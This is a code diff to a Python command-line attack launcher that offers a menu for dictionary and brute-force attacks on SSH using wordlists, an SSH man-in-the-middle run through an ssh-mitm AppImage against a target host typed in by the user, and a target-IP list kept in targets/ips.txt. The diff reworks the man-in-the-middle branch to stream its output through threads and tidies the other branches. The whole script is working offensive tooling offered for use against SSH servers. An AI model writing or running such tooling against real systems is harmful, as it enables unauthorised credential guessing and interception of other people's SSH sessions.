@@ -1,7 +1,9 @@
 import glob
 import subprocess
+import threading
 
-while True:
+loopControl = True
+while loopControl:
     user_choice = input(
         "\nSelect option:\n"
         "1. Launch dictionary attack & brute force\n"
@@ -24,7 +26,6 @@ while True:
                 "ssh", "-o", "output.txt"
             ]
 
-            
             with subprocess.Popen(
                 cmd,
                 stdout=subprocess.PIPE,
@@ -38,45 +39,52 @@ while True:
                 print(f"{wordlist} finished with return code {p.returncode}")
 
     elif user_choice == "2":
-        print("starting MITM.... USE WITH OpenSSH v7.5p1 FOR BEST RESULTS")
+        def pump(stream, label):
+            for line in iter(stream.readline, ''):
+                print(f"[{label}] {line}", end='')
+            stream.close()
+
         appimage_path = "mitm/./ssh-mitm-x86_64.AppImage"
         mitmChoice = input("TARGET-HOST:")
         command = [appimage_path, "server", "--remote-host", mitmChoice]
-        try:
-            process = subprocess.Popen(
-                command,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,  
-                start_new_session=True  
-            )
-            print(f"Started SSH-MITM with PID: {process.pid}")
 
-            for line in iter(process.stdout.readline, ''):
-                print(f"Output: {line.strip()}")
-        
-            process.wait()
+        process = subprocess.Popen(
+            command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True,
+            bufsize=1,
+        )
 
-        except subprocess.CalledProcessError as e:
-            print(f"An error occurred: {e}")
+        print(f"Started SSH-MITM with PID: {process.pid}")
+
+        t1 = threading.Thread(target=pump, args=(process.stdout, "STDOUT"), daemon=True)
+        t2 = threading.Thread(target=pump, args=(process.stderr, "STDERR"), daemon=True)
+        t1.start()
+        t2.start()
+
+        rc = process.wait()
+        print(f"MITM exited with return code {rc}")
 
     elif user_choice == "3":
         with open("targets/ips.txt", "r") as f:
             lines = f.readlines()
 
-            ipCount = len(lines)
-            content = "".join(lines)
+        ipCount = len(lines)
+        content = "".join(lines)
 
-            print(f"Target Count: {ipCount}")
-            print(content)
+        print(f"Target Count: {ipCount}")
+        print(content)
+
+    elif user_choice == "4":
+        user_text = input("ENTER TARGET IP WITH SSH:")
+        with open("targets/ips.txt", "a") as f:
+            f.write(user_text + "\n")
+        print("target", user_text, "added")
 
     elif user_choice == "5":
         print("Exiting program.")
-        break  
-    elif user_choice == "4":
-        user_text = input('ENTER TARGET IP WITH SSH:')
-        with open("targets/ips.txt", "a") as f:
-            f.write(user_text + "\n")
-            print("target",user_text, "added")
+        break
+
     else:
         print("Wrong Input...try again.")
